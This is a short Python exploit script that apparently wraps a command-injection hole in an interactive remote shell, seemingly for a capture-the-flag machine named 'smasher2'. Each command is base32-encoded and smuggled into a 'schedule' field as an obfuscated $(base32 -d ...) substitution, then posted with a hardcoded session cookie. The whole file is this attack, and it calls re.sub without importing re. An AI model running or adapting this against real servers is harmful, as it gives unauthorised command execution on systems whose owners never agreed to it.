from termcore import termcore
import os
import base64
import requests

sessid = 'S0m5S3SS10n1Dh3R3' 
url = 'http://example.com/remotecommands'
headers = {
	'Cookie' : 'session=' + sessid,
	'Content-Type': 'application/json'
}

class myTerm(termcore):
	def preExec(self, command, params):
		return "$(''base32 -''d <<< '" + str(base64.b32encode((command + " " + params).encode())) + "')"

	def postExec(self,response):
	    response = re.sub(r"\<.*\>", "", response)
	    return response

	def Exec(self, payload):
		return requests.post(url, data={'schedule': payload}, headers=headers).text

term = myTerm("dzonerzy", "smasher2")